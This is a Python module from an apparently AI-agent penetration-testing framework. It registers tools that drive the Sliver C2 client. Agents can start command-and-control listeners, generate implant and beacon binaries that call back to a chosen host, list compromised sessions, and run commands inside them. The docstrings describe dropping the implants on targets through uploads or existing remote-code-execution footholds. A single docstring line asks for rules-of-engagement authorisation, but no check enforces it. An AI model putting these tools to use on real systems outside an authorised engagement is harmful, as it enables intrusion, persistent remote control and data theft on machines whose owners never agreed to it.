"""Sliver C2 integration — high-level wrappers over sliver-client.

The heavy lifting is done by the sliver-client binary running inside the
sandbox container via the persistent tmux_interactive session. These
actions are thin convenience wrappers so agents don't need to remember
the exact sliver console syntax — they call generate_implant() with typed
arguments and get back a ready-to-deploy binary path.

Implants are generated against a team server reachable at
`ZIRO_SLIVER_SERVER_URL` with an operator config at
`ZIRO_SLIVER_OPERATOR_CFG`. If neither is set, the tool returns a clear
error pointing at containers/sliver-compose.yml.
"""

from __future__ import annotations

import os
import shlex
from typing import Any, Literal

from ziro.tools.registry import register_tool


_SLIVER_SESSION_NAME = "sliver-c2"


def _sliver_ready() -> tuple[bool, str]:
    url = os.getenv("ZIRO_SLIVER_SERVER_URL", "").strip()
    cfg = os.getenv("ZIRO_SLIVER_OPERATOR_CFG", "").strip()
    if not url or not cfg:
        return False, (
            "Sliver C2 not configured. Set ZIRO_SLIVER_SERVER_URL (e.g., localhost:31337) "
            "and ZIRO_SLIVER_OPERATOR_CFG (path to operator .cfg file). "
            "See containers/sliver-compose.yml for the team server deployment."
        )
    return True, ""


def _ensure_session(agent_state: Any) -> dict[str, Any]:
    """Lazily start a persistent sliver-client session for this agent."""
    from ziro.tools.tmux_interactive.manager import get_manager

    manager = get_manager()
    existing = manager.get(_SLIVER_SESSION_NAME)
    if existing and existing.is_alive():
        return {"success": True, "info": existing.info(), "reused": True}

    cfg = os.getenv("ZIRO_SLIVER_OPERATOR_CFG", "").strip()
    command = f"sliver-client --config {shlex.quote(cfg)}" if cfg else "sliver-client"
    result = manager.start(
        name=_SLIVER_SESSION_NAME,
        command=command,
        prompt_regex=r"\[server\][^>]*>\s*$|sliver[^>]*>\s*$",
    )
    return result


@register_tool(sandbox_execution=True)
def sliver_connect(agent_state: Any) -> dict[str, Any]:
    """Establish the sliver-client persistent session inside the sandbox.

    Safe to call multiple times — reuses an existing session if alive.
    Returns current prompt state; wait for it to settle at `[server] >` before
    issuing further commands.
    """
    ready, err = _sliver_ready()
    if not ready:
        return {"success": False, "error": err}
    return _ensure_session(agent_state)


@register_tool(sandbox_execution=True)
def sliver_command(agent_state: Any, command: str, wait_seconds: float = 10.0) -> dict[str, Any]:
    """Send a raw command to the sliver console (e.g., `sessions`, `jobs`, `help`).

    The connected session must already exist via sliver_connect. Returns the
    captured buffer after the prompt reappears.
    """
    ready, err = _sliver_ready()
    if not ready:
        return {"success": False, "error": err}

    from ziro.tools.tmux_interactive.manager import get_manager

    manager = get_manager()
    if manager.get(_SLIVER_SESSION_NAME) is None:
        start_result = _ensure_session(agent_state)
        if not start_result.get("success"):
            return start_result

    return manager.send(
        name=_SLIVER_SESSION_NAME,
        text=command,
        wait_for_prompt=True,
        timeout=wait_seconds,
    )


@register_tool(sandbox_execution=True)
def generate_implant(
    agent_state: Any,
    name: str,
    target_os: Literal["linux", "windows", "darwin"] = "linux",
    target_arch: Literal["amd64", "386", "arm64"] = "amd64",
    protocol: Literal["mtls", "https", "http", "dns", "wg"] = "https",
    callback_host: str = "",
    callback_port: int = 0,
    format_type: Literal["exe", "shared", "service", "shellcode"] = "exe",
    output_dir: str = "/workspace/implants",
    beacon: bool = False,
    beacon_interval_seconds: int = 60,
    beacon_jitter_seconds: int = 30,
) -> dict[str, Any]:
    """Generate a Sliver implant (beacon or session) for the target OS/arch.

    Wraps the sliver `generate` command with typed arguments. Requires a
    listener to already be running — call start_listener() first if you
    haven't.

    Returns the absolute path to the generated implant binary inside the
    sandbox, which can then be dropped onto a target via file upload or
    an existing RCE primitive.

    IMPORTANT: Only generate and deploy implants on targets authorized by
    the RoE. See create_roe for the written scope document.
    """
    ready, err = _sliver_ready()
    if not ready:
        return {"success": False, "error": err}

    if not name or not callback_host or not callback_port:
        return {
            "success": False,
            "error": "name, callback_host, and callback_port are required",
        }

    os.makedirs(output_dir, exist_ok=True)

    # Build sliver generate command
    verb = "generate beacon" if beacon else "generate"
    args = [
        verb,
        f"--{protocol}",
        f"{callback_host}:{callback_port}",
        f"--os {target_os}",
        f"--arch {target_arch}",
        f"--format {format_type}",
        f"--save {shlex.quote(output_dir)}",
        f"--name {shlex.quote(name)}",
    ]
    if beacon:
        args.append(f"--seconds {beacon_interval_seconds}")
        args.append(f"--jitter {beacon_jitter_seconds}")
    command = " ".join(args)

    # Run through the persistent console
    from ziro.tools.tmux_interactive.manager import get_manager

    manager = get_manager()
    if manager.get(_SLIVER_SESSION_NAME) is None:
        _ensure_session(agent_state)

    send_result = manager.send(
        name=_SLIVER_SESSION_NAME,
        text=command,
        wait_for_prompt=True,
        timeout=120.0,  # implant builds can be slow
    )

    if not send_result.get("success"):
        return send_result

    buffer = send_result.get("buffer", "")
    # Typical sliver output: "Implant saved to /path/to/binary"
    import re

    match = re.search(r"[Ss]aved to\s+(\S+)", buffer)
    saved_path = match.group(1) if match else ""

    return {
        "success": True,
        "implant_name": name,
        "saved_path": saved_path,
        "buffer_tail": "\n".join(buffer.splitlines()[-20:]),
        "command": command,
    }


@register_tool(sandbox_execution=True)
def start_listener(
    agent_state: Any,
    protocol: Literal["mtls", "https", "http", "dns", "wg"],
    host: str = "0.0.0.0",
    port: int = 0,
    domain: str = "",
) -> dict[str, Any]:
    """Start a Sliver listener for implant callbacks.

    Protocols:
    - mtls: mutual TLS (default operator channel, most secure)
    - https: HTTPS C2 with optional domain fronting
    - http: plain HTTP (testing only)
    - dns: DNS tunnel C2 (slow but stealthy, domain required)
    - wg: WireGuard
    """
    ready, err = _sliver_ready()
    if not ready:
        return {"success": False, "error": err}

    if not port and protocol != "dns":
        default_ports = {"mtls": 8888, "https": 8443, "http": 8080, "wg": 53}
        port = default_ports.get(protocol, 8443)

    if protocol == "dns" and not domain:
        return {"success": False, "error": "DNS listener requires --domain argument"}

    parts = [protocol, f"--lhost {host}"]
    if port:
        parts.append(f"--lport {port}")
    if domain:
        parts.append(f"--domains {shlex.quote(domain)}")
    command = " ".join(parts)

    from ziro.tools.tmux_interactive.manager import get_manager

    manager = get_manager()
    if manager.get(_SLIVER_SESSION_NAME) is None:
        _ensure_session(agent_state)

    result = manager.send(
        name=_SLIVER_SESSION_NAME,
        text=command,
        wait_for_prompt=True,
        timeout=30.0,
    )
    return result


@register_tool(sandbox_execution=True)
def list_sessions_and_beacons(agent_state: Any) -> dict[str, Any]:
    """List all active sliver sessions, beacons, and jobs in one call.

    Returns the concatenated output of `sessions`, `beacons`, and `jobs`.
    """
    ready, err = _sliver_ready()
    if not ready:
        return {"success": False, "error": err}

    from ziro.tools.tmux_interactive.manager import get_manager

    manager = get_manager()
    if manager.get(_SLIVER_SESSION_NAME) is None:
        _ensure_session(agent_state)

    outputs: dict[str, str] = {}
    for cmd in ("sessions", "beacons", "jobs"):
        result = manager.send(
            name=_SLIVER_SESSION_NAME,
            text=cmd,
            wait_for_prompt=True,
            timeout=15.0,
        )
        outputs[cmd] = result.get("buffer", "")

    return {"success": True, "outputs": outputs}


@register_tool(sandbox_execution=True)
def interact_with_session(
    agent_state: Any, session_id: str, command: str, wait_seconds: float = 30.0
) -> dict[str, Any]:
    """Select a sliver session/beacon by id and run a single command inside it.

    Runs `use <session_id>` then the provided command, captures output, then
    returns to the server prompt via `background`. Safe to chain across
    multiple calls without leaving the session permanently selected.
    """
    ready, err = _sliver_ready()
    if not ready:
        return {"success": False, "error": err}

    from ziro.tools.tmux_interactive.manager import get_manager

    manager = get_manager()
    if manager.get(_SLIVER_SESSION_NAME) is None:
        _ensure_session(agent_state)

    outputs = []
    for step in (f"use {session_id}", command, "background"):
        result = manager.send(
            name=_SLIVER_SESSION_NAME,
            text=step,
            wait_for_prompt=True,
            timeout=wait_seconds,
        )
        outputs.append({"step": step, "buffer_tail": "\n".join(result.get("buffer", "").splitlines()[-15:])})

    return {"success": True, "session_id": session_id, "steps": outputs}
